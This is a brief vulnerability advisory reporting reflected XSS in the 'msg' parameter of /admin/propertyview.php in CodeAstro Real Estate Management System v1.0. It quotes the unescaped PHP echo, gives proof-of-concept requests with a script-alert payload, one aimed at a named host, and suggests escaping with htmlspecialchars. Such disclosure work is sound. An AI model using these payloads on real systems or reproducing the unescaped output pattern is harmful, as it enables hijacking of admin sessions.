# XSS in CodeAstro Real Estate Management System v1.0 of file /propertyview.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /admin/propertyview.php

**Version**

- V1.0

### POC 

/admin/propertyview.php

Reflected XSS Vulnerability

**Location:**
Lines 81–84:

````php path=admin/propertyview.php mode=EXCERPT
<?php 
if(isset($_GET['msg']))	
    echo $_GET['msg'];	
?>
````

**Description:**
The GET parameter `msg` is echoed directly into the page without any filtering or escaping, resulting in a severe reflected XSS vulnerability.

**HTTP request to trigger the vulnerability:**

```http
GET /admin/propertyview.php?msg=<script>alert('Admin XSS')</script> HTTP/1.1
Host: target.com
Cookie: PHPSESSID=admin_session_id
```

---

## Remediation

1. **XSS Fix:** Escape the output with `htmlspecialchars($_GET['msg'], ENT_QUOTES, 'UTF-8')`.

```
http://www.realestate1.top/admin/propertyview.php?msg=%3Cscript%3Ealert(%27Admin%20XSS%27)%3C/script%3E 
```

![image-20250817163215125](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171632288.png)